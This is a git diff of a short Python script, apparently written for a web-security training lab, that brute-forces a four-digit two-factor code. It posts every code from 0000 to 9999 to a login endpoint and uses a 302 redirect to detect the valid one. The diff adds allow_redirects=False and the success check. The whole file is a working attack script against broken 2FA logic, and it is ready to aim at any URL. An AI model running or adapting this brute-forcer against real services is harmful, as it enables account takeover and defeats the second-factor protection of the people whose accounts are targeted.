@@ -2,6 +2,7 @@ import requests
 from requests_toolbelt.utils import dump
 import sys
 
+# 2fa_broken_logic_v1 is 'better' version because of fix (not allowing redirections)
 
 url = ''
 session_key = ''
@@ -32,12 +33,11 @@ http = requests.Session()
 
 i = 0
 for i in range(10000):
-    r = http.post('https://'+url+path,headers=HEADERS, data='mfa-code='+str('{0:04}'.format(i)))
+    # allow_redirects has to be False because if it is not request returns status code from url user is redirected to (for some unknown reason for me)
+    r = http.post('https://'+url+path,headers=HEADERS, data='mfa-code='+str('{0:04}'.format(i)), allow_redirects=False)
     sys.stdout.write('\r'+str('{0:04}'.format(i)))
     sys.stdout.flush()
-# did not stop as expected but solved the lab since i accesed profile of user carlos
-# to_do fix 
-    if r.status_code != 200:
-        print(r.status_code)
-        print(i)
+    if r.status_code == 302:
+        print(f'status code : {r.status_code}')
+        print(f'2fa code : {str("{0:04}".format(i))}')
         break
